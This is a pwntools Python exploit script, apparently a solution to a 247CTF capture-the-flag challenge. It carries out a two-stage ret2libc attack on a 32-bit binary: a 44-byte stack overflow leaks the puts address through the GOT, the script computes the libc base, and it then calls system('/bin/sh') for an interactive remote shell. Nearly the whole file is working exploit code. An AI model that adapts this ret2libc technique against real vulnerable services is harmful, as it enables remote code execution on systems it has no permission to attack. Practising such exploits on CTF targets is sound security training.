#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./executable_stack --host 1a892a34ee15e655.247ctf.com --port 50431
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./non_executable_stack')
rop = ROP(exe)
# libc = ELF('libc.so.6')

# Remote target info
host = args.HOST or '9082a3c523918884.247ctf.com'
port = int(args.PORT or 50184)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# GDB script for debugging (optional)
gdbscript = '''
tbreak main
continue
break *0x8048410
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# Buffer for EIP overwrite (must be bytes)
buff = b'A' * 44

# STAGE 1: Leak puts address

log.info('Payload format: [44 bytes buffer] + [puts() addr] + [main() addr] + [puts@got]')
payload = buff
payload += p32(exe.plt['puts'])
payload += p32(exe.symbols['main'])
payload += p32(exe.got['puts'])

print(io.recvline(timeout=1))  # Receive any initial output
log.info('Sending stage 1 payload.')
io.sendline(payload)
print(io.recvline(timeout=1))  # Receive output after payload

puts_leak = io.recv(4)
puts_leak = u32(puts_leak)
log.info(f'Puts leak: {hex(puts_leak)}')

# Define libc (local copy of the libc used by remote binary)
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so')

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search(b'/bin/sh\x00'))

libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
exit_addr = libc_base + exit_offset

log.info('libc base calculated: {}'.format(hex(libc_base)))
log.info('system() address: {}'.format(hex(system_addr)))
log.info('/bin/sh address: {}'.format(hex(binsh_addr)))

# STAGE 2: Call system("/bin/sh")

payload = buff
payload += p32(system_addr)
payload += p32(exit_addr)    # Return address after system()
payload += p32(binsh_addr)   # Argument to system()

log.info('Sending stage 2 payload.')
io.sendline(payload)

log.info('Enjoy your shell!')
io.interactive()
